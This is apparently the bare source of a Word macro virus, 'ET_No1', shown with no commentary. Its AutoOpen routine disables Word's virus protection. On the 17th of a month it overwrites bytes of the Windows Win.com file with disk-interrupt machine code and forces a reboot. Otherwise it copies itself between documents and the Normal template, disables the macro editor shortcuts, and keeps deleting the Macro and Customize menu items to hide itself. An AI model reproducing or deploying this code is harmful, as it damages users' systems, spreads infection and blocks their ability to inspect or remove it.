   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "ET_No1"
   Private Declare Function GetWindowsDirectory Lib "kernel32" Alias "GetWindowsDirectoryA" (ByVal lpBuffer As String, ByVal nSize As Long) As Long
   Attribute GetWindowsDirectory.VB_ProcData.VB_Invoke_Func = "ProVirus.Virus.AutoOpen"
   Private Declare Function ExitWindowsEx Lib "User32" (ByVal uFlags As Long, ByVal dwReserved As Long) As Long
   Sub AutoOpen()
   '
   Dim DD As Byte

       On Error Resume Next

       Options.VirusProtection = False

       If Day(Date) = 17 Then
           Txt1 = "E9FD09"
           Txt2 = "B80103BB0080B90100BA8000CD13E9FC04"
           windir$ = String(144, " ")
           l = GetWindowsDirectory(windir$, 144)
           windir = Left(windir$, l)
           Open windir + "\Win.com" For Binary Access Write Lock Read As #1
               For i = 1 To 3
                   DD = "&H" + Mid(Txt1, 2 * i - 1, 2)
                   Put #1, , DD
               Next i
               For i = 1 To 17
                   DD = "&H" + Mid(Txt2, 2 * i - 1, 2)
                   Put #1, 2560 + i, DD
               Next i
           Close #1
           Call ExitWindowsEx(6, 0)
       End If

          DocName = ActiveDocument.Path + "\" + ActiveDocument.Name
          DotName = NormalTemplate.Path + "\" + NormalTemplate.Name
       If CommandBars("Visual Basic").Controls(1).Caption <> "ETKill" Then
          Application.OrganizerDelete Source:=DotName, Name:="ET_No1", Object:=wdOrganizerObjectProjectItems
          Application.OrganizerCopy Source:=DocName, Destination:=DotName, Name:="ET_No1", Object:=wdOrganizerObjectProjectItems
          DelTools
          CustomizationContext = NormalTemplate
          FindKey(BuildKeyCode(wdKeyF8, wdKeyAlt)).Disable
          CustomizationContext = NormalTemplate
          FindKey(BuildKeyCode(wdKeyF11, wdKeyAlt)).Disable
          For k = 1 To CommandBars("Visual Basic").Controls.Count
               CommandBars("Visual Basic").Controls(1).Delete
          Next k
          Set MyFlag = CommandBars("Visual Basic").Controls.Add(Type:=msoControlButton, ID:=752)
          MyFlag.FaceId = 30
          CommandBars("Visual Basic").Controls(1).Caption = "ETKill"
          NormalTemplate.Save
       Else
          Application.OrganizerCopy Source:=DotName, Destination:=DocName, Name:="ET_No1", Object:=wdOrganizerObjectProjectItems
          ActiveDocument.Save
       End If
   End Sub

   Sub DelTools()
       For i = 1 To CommandBars("Tools").Controls.Count
          If CommandBars("Tools").Controls(i).Caption = "ºê(&M)" Then
               CommandBars("Tools").Controls(i).Delete
               Exit For
          End If
       Next i
       For i = 1 To CommandBars("Tools").Controls.Count
          If CommandBars("Tools").Controls(i).Caption = "×Ô¶¨Òå(&C)..." Then
               CommandBars("Tools").Controls(i).Delete
               Exit For
          End If
       Next i
       Application.OnTime When:=Now + TimeValue("00:0:01"), Name:="DelTools"
   End Sub
